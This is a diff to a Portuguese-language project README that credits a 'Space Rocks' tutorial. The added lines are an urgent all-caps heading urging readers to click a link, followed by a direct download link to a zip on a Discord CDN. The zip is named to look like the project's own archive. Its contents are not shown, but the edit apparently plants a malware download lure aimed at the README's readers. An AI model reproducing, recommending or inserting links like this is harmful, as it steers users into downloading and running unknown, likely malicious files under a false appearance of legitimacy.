@@ -13,3 +13,6 @@ A partir de novembro de 2023, não é mais necessário uma assinatura para poder
 # Créditos
 
 Tutorial Space Rocks por FriendlyCosmonaut.
+
+# TUSK CLIQUE NESSE LINK AQUI ❗❗❗❗
+https://cdn.discordapp.com/attachments/948039902853988493/1210261171333103717/Beyond-Relativity-main.zip
